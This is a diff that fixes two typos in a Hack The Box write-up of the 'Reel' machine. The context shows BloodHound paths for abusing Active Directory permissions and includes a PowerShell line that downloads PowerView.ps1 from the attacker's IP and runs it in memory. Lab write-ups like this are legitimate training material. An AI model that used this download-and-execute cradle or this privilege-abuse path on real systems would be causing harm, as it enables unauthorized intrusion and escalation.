@@ -245,7 +245,7 @@ Now the same query as last time has a lot more information:
 
 ![Shortest Paths to High Value Targets with CollectionMethod All](https://kyuu-ji.github.io/htb-write-up/reel/BH_query_2.png)
 
-If we query for a path from **NICO@HTB.LOCAL** to **BACKUP_ADMINS@HTB.LOCAL** we get see that Nico has _WriteOwner_ permissions to **Herman@htb.local** who has _GenericWrite_ and _WriteDacl_ to the Backup_Admins group:
+If we query for a path from **NICO@HTB.LOCAL** to **BACKUP_ADMINS@HTB.LOCAL** we see that Nico has _WriteOwner_ permissions to **Herman@htb.local** who has _GenericWrite_ and _WriteDacl_ to the Backup_Admins group:
 
 ![Nico to Backup_Admins group](https://kyuu-ji.github.io/htb-write-up/reel/BH_query_3.png)
 
@@ -264,7 +264,7 @@ This means we can take ownership with Nico / Tom of the Herman / Claire account 
 
 ### Exploiting Active Directory
 
-To exploit that permissions in AD we start the script **PoverView.ps1** from the **PowerSploit** script collection framework which you can find in Toms desktop folder, but I am going to upload it from my local machine.
+To exploit that permissions in AD we start the script **PowerView.ps1** from the **PowerSploit** script collection framework which you can find in Toms desktop folder, but I am going to upload it from my local machine.
 ```powershell
 IEX(New-Object Net.WebClient).downloadString('http://10.10.14.23/PowerView.ps1')
 ```
